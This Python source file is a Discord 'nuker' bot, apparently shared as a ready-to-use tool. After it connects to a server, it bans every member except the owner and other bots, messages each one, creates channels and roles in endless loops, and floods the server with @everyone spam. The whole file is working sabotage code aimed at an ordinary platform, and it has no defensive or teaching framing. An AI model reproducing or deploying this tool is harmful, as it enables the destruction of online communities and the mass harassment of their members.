
import discord
from discord.ext import commands
import asyncio
import os

TOKEN = "YOUR_TOKEN"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

creator = "YourNameHere"

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("="*50)
    print(f"     Discord Nuker Tool | By {creator}")
    print("="*50)
    guild = bot.guilds[0]
    print(f"Connected to: {guild.name} ({guild.id})")
    print("Nuking will start in 5 seconds...")
    await asyncio.sleep(5)
    await nuke_server(guild)

async def nuke_server(guild):
    # تبنيد الأعضاء
    asyncio.create_task(ban_all(guild))

    # سبام رومات
    asyncio.create_task(spam_channels(guild, "nuked-by-"+creator.lower()))

    # سبام رتب
    asyncio.create_task(spam_roles(guild, "get-rekt"))

    # كراش بعد دقيقة
    asyncio.create_task(crash_later())

async def ban_all(guild):
    for member in guild.members:
        if member == guild.owner or member.bot:
            continue
        try:
            await member.send("You’ve been banned from the server. Bye!")
        except:
            pass
        try:
            await member.ban(reason="Nuked")
            print(f"[BANNED] {member}")
        except:
            pass

async def spam_channels(guild, name):
    while True:
        try:
            channel = await guild.create_text_channel(name)
            asyncio.create_task(spam_messages(channel))
        except:
            pass
        await asyncio.sleep(0.3)

async def spam_messages(channel):
    while True:
        try:
            await channel.send("@everyone nuked by " + creator)
        except:
            break
        await asyncio.sleep(1)

async def spam_roles(guild, name):
    while True:
        try:
            await guild.create_role(name=name)
        except:
            pass
        await asyncio.sleep(0.3)

async def crash_later():
    await asyncio.sleep(60)
    raise Exception("Intentional crash after 1 minute.")

bot.run(TOKEN)
